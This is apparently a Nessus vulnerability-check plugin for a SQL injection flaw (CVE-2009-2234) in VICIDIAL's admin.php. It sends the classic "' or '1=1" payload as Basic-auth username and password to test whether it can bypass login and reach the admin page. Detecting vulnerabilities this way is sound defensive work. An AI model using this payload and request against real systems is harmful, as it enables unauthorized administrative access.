#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38889);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2009-2234");
  script_bugtraq_id(35056);
  script_xref(name:"milw0rm", value:"8755");
  script_xref(name:"OSVDB", value:"55431");
  script_xref(name:"Secunia", value:"35325");

  script_name(english:"VICIDIAL Call Center Suite admin.php SQL Injection");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is prone to a SQL\n",
      "injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running the VICIDIAL Call Center Suite, a set of\n",
      "programs for Asterisk that act as a complete call center suite.\n",
      "\n",
      "The version of this software installed on the remote host fails to\n",
      "sanitize user-supplied input to the 'PHP_AUTH_USER' and 'PHP_AUTH_PW'\n",
      "variables before using it to construct database queries.  Provided\n",
      "VICIDIAL has been configured to support use of non-Latin characters,\n",
      "which is not true by default, an unauthenticated attacker can exploit\n",
      "this issue to manipulate database queries to, for example, bypass\n",
      "authentication and gain administrative access."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.eflo.net/VICIDIALforum/viewtopic.php?t=8075"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Either apply the patch security_fix_admin_20090522.patch or disable\n",
      "use of non-Latin characters in VICIDIAL."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


user = "' or '1=1";
pass = "' or '1=1";


# Loop through directories.
#
# nb: I don't expect the directory will be discovered generally.
dirs = list_uniq(make_list("/vicidial", cgi_dirs()));

foreach dir (dirs)
{
  # Try to exploit the issue to bypass authentication.
  url = string(dir, "/admin.php");

  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array(
      'Authorization',
      string('Basic ', base64(str:user+":"+pass))
    )
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we've bypassed authentication.
  if (
    'title>VICIDIAL ADMIN:' >< res[2] &&
    '/admin.php?force_logout=1">' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req_str, "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}
